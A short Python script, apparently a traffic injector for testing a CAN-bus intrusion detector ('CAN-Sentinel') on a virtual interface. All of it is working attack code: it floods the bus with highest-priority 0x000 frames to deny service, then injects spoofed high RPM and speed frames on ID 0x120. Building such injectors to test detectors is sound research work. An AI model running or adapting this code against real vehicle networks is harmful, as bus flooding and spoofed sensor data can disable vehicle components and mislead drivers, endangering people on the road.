import time
import can
import random

# Initialize CAN bus interface
bus = can.interface.Bus(channel='vcan0', interface='socketcan')

def send_dos_attack(duration_sec=3):
    print("[!] Starting High-Frequency DoS Attack (Arbitration ID: 0x000)...")
    end_time = time.time() + duration_sec
    while time.time() < end_time:
        msg = can.Message(arbitration_id=0x000, data=[0x00]*8, is_extended_id=False)
        bus.send(msg)
        time.sleep(0.005)  # 5ms injection rate
    print("[+] DoS Attack completed.")

def send_spoof_rpm_attack(count=30):
    print("[!] Injecting Malicious RPM Spoofed Frames (Arbitration ID: 0x120)...")
    for _ in range(count):
        fake_rpm = random.randint(9000, 12000)
        fake_speed = random.randint(180, 240)
        
        rpm_b1 = (fake_rpm >> 8) & 0xFF
        rpm_b2 = fake_rpm & 0xFF
        spd_b1 = (fake_speed >> 8) & 0xFF
        spd_b2 = fake_speed & 0xFF
        
        msg = can.Message(arbitration_id=0x120, data=[rpm_b1, rpm_b2, spd_b1, spd_b2], is_extended_id=False)
        bus.send(msg)
        time.sleep(0.05)
    print("[+] RPM Spoofing completed.")

if __name__ == "__main__":
    print("[*] CAN-Sentinel Attack Injector Ready.")
    time.sleep(2)
    send_dos_attack(duration_sec=3)
    time.sleep(2)
    send_spoof_rpm_attack(count=30)
